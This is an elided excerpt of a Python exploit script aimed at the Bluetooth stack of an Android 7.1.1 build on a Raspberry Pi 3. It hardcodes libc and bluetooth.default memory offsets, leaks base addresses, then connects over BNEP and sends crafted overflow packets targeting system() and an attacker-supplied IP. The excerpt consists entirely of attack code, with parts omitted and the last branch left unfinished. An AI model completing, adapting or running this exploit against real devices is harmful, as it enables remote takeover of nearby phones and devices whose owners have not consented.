...
# For 7.1.1 android build Raspberry Pi 3
# libc: 0xb086f000
# bluetooth.default: 0x99736000
LIBC_TEXT_STSTEM_OFFSET = 0x45ec0 + 1
LIBC_SOME_BLX_OFFSET = 0xb08fd4f9 - 0xb086f000
BSS_ACL_REMOTE_NAME_OFFSET = 0x9a4d3c39 - 0x9a2da000
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x997fcc99 - 0x99736000
...
def set_rand_bdaddr(src_hci):
    print("CURRENTLY NOT SETTING THE BT ADDRESS!!!")
    return 'F8:16:54:28:8A:24'.lower()
...
def memory_leak_get_bases(src, src_hci, dst):
    ...
    likely_some_libc_blx_offset = result[-8][1]
    likely_some_bluetooth_default_global_var_offset = result[3][0]
...
def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):
    ...
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    print("Set to aeiou. Sleeping now..")
    time.sleep(100000)
    ...
    for i in range(1000):
        ...
        bnep.send(binascii.unhexlify('810100') +
                  struct.pack('<IIII', 0x41414141, 0x41414141, 0x41414141, acl_name_addr))
    else:
